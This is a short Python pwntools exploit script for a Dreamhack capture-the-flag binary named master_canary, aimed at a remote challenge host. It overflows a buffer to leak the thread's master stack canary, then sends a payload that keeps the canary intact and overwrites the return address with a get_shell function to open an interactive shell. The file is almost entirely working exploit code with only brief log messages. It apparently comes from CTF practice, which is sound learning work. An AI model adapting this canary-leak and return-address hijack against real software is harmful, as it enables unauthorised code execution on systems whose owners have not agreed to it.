#!/usr/bin/python3

import pwn

#p = pwn.process("./master_canary")
p = pwn.remote("host1.dreamhack.games", 11027)
elf = pwn.ELF("./master_canary")
pwn.context.log_level = 'debug'

shell = elf.symbols['get_shell']

padding = b"AAAAAAAA" # Input: x285, Exit: x5
garbage = "Data: " + "A"*0x8e9

pwn.log.info("Create thread...")
p.recvuntil(">")
p.sendline("1")

pwn.log.info("Spoof Master Canary...")
payload = padding*285
payload += b"A"
p.recvuntil(">")
p.sendline("2")
p.sendlineafter("Size: ", "2281")
p.sendlineafter("Data: ", payload)
p.recvuntil(garbage)
nary = p.recv(7)
canary = pwn.u64(b"\x00" + nary)
pwn.log.info("Canary Found: " + hex(canary))

pwn.log.info("Bring me shell!!!")
payload = padding*5
payload += pwn.p64(canary)
payload += padding
payload += pwn.p64(shell)
p.recvuntil(">")
p.sendline("3")
p.sendlineafter("Leave comment: ", payload)

p.interactive()

"""
String start: at read_bytes $rbp-0x28
"""
